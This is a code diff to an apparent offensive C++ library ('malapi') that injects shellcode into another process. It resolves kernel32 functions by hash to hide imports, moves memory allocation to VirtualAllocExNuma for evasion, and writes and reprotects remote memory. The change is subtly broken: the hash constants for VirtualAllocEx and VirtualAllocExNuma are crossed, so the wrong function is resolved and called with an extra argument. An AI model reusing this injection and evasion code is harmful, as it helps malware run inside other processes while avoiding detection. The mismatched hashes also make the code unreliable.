@@ -169,12 +169,14 @@ namespace malapi
 		HMODULE kernel32 = NULL;
 		DWORD old_protection = 0;
 
-		typeVirtualAllocEx VirtualAllocExC = NULL;
+		// typeVirtualAllocEx VirtualAllocExC = NULL;
+		typeVirtualAllocExNuma VirtualAllocExNumaC = NULL;
 		typeVirtualProtectEx VirtualProtectExC = NULL;
 		typeWriteProcessMemory WriteProcessMemoryC = NULL;
 		typeGetLastError GetLastErrorC = NULL;
 
-		constexpr ULONG hash_virtualallocex = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocEx");
+		// constexpr ULONG hash_virtualallocex = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocExNuma");
+		constexpr ULONG hash_virtualallocexnuma = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocEx");
 		constexpr ULONG hash_virtualprotectex = malapi::HashStringFowlerNollVoVariant1a("VirtualProtectEx");
 		constexpr ULONG hash_writeprocessmemory = malapi::HashStringFowlerNollVoVariant1a("WriteProcessMemory");
 		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
@@ -183,12 +185,13 @@ namespace malapi
 		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
 		if (kernel32 == NULL) return NULL;
 
-		VirtualAllocExC = (typeVirtualAllocEx)malapi::GetProcAddressC(kernel32, hash_virtualallocex);
+		// VirtualAllocExC = (typeVirtualAllocEx)malapi::GetProcAddressC(kernel32, hash_virtualallocex);
+		VirtualAllocExNumaC = (typeVirtualAllocExNuma)malapi::GetProcAddressC(kernel32, hash_virtualallocexnuma);
 		VirtualProtectExC = (typeVirtualProtectEx)malapi::GetProcAddressC(kernel32, hash_virtualprotectex);
 		WriteProcessMemoryC = (typeWriteProcessMemory)malapi::GetProcAddressC(kernel32, hash_writeprocessmemory);
 		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
 
-		address_ptr = VirtualAllocExC(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+		address_ptr = VirtualAllocExNumaC(process_handle, NULL, shellcode_size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE, 0);
 		if (address_ptr == NULL)
 		{
 			LOG_ERROR("Failed to allocate memory space (Code: %08lX)", GetLastErrorC());
@@ -528,6 +531,21 @@ namespace malapi
 			*d++ = *s++;
 		}
 
+		return Destination;
+	}
+
+	//
+	// memset implementation.
+	//
+	void* memset(void* Destination, int Value, size_t Size)
+	{
+		// logic similar to memset's one
+		unsigned char* p = (unsigned char*)Destination;
+		while (Size > 0) {
+			*p = (unsigned char)Value;
+			p++;
+			Size--;
+		}
 		return Destination;
 	}
 
